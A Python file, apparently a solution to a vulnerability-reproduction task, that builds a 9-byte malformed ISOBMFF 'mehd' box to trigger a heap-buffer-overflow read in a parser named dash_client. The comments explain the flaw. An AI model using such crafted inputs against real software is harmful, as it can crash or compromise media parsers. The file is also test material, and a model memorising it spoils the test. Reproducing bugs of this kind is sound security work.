import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a heap-buffer-overflow in the parsing of an
        # ISOBMFF 'mehd' (Movie Extends Header) box in dash_client.
        #
        # An ISOBMFF box consists of an 8-byte header (4-byte size, 4-byte type)
        # and a payload. The payload for a 'mehd' box expects at least 4 bytes
        # for a version and flags field.
        #
        # By crafting a box with a total size of 9 bytes, the payload size
        # becomes 1 byte (9 total - 8 header). The parser successfully reads
        # the 1-byte version but then attempts to read 3 bytes for the flags,
        # resulting in a read beyond the bounds of the heap-allocated payload buffer.
        #
        # PoC structure:
        # - size: 9 (as a 4-byte big-endian integer: 0x00000009)
        # - type: 'mehd' (as 4 bytes of ASCII)
        # - payload: 1 byte (e.g., 0x00, which will be interpreted as the version)
        
        size = 9
        box_type = b'mehd'
        payload = b'\x00'
        
        # Pack size as a 4-byte big-endian integer
        poc = struct.pack('>I', size)
        poc += box_type
        poc += payload
        
        return poc